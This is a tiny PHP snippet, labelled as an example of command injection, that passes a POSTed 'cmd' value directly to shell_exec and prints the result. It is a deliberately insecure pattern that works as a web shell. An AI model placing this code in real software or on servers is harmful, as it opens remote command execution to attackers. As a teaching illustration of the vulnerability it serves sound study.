<?php
// Example of Command Injection
if (isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd']);
    echo $output;
}
?>